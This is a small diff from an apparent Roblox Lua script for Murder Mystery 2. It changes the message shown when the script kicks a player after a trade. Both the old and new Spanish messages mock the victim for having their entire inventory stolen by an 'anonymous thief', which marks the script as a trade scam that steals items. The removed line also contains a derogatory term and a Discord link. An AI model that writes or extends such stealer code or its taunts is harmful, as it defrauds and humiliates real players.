@@ -537,7 +537,7 @@ local function TradeFinalizado()
     
     -- Tiempo de espera antes del Kick, puedes cambiar 3 a cualquier valor
     task.wait(3)
-    LocalPlayer:Kick("El mejor ladron Anonimo, a robado todo tu invententario de mm2 😂😂🤣 llora negro https://discord.gg/4VySnCHy")
+    LocalPlayer:Kick("El ladron encubierto Anonimo🥷, a robado todo tu invententario de mm2, llora niño/a🤣😂🥱")
 end
 
 -- Trade principal
